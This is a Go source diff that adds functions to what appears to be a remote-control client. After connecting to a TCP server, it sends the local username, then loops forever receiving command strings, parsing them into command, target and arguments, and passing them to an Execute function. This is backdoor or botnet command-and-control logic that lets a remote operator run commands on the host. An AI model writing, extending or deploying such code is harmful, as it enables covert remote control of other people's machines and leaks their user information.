@@ -33,6 +33,13 @@ func Connect() {
 	Connection, _ = net.Dial("tcp", ip)
 }
 
+func EstablishConnection() {
+	Connect()
+	go Send("user", utils.GetUsername())
+	go ListenAndExecute()
+	Reconnect()
+}
+
 // Reconnect renews te connection every 10 minutes (To be inproved)
 // TODO add automatic reconection when connection dies
 func Reconnect() {
@@ -134,4 +141,29 @@ func Receive() string {
 	}
 
 	return status
+}
+
+// ListenAndExecute recives commands and executes them
+func ListenAndExecute() {
+	for {
+		status := Receive()
+		go ParseProtocol(status)
+	}
+
+}
+
+// ParseProtocol handles recived connections using legacy method
+func ParseProtocol(r string) {
+	commandBuff := strings.Split(r, " ")
+	if len(commandBuff) > 1 {
+		cmd := commandBuff[0]
+		target := commandBuff[1]
+		args := "null"
+		if len(commandBuff) >= 3 {
+			args = commandBuff[2]
+		}
+		//Concurrently executes command
+		Execute(cmd, target, args)
+
+	}
 }
